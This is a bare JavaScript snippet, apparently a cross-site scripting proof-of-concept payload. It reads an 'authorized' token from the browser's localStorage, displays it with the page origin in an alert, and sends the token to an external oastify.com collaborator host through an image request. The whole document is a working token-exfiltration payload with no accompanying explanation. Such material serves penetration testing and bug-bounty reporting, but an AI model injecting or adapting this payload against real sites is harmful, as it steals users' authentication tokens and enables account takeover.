(function() {
    var token = localStorage.getItem('authorized');
    var origin = window.origin;
    alert(`Origin is: ${origin} and the token: "${token}"`);
    var img = new Image();
    img.src = 'https://u836ktcnh3tkc6jewfhdr5uzuq0ho9kx9.oastify.com/?authorized=' + encodeURIComponent(token);
  })();
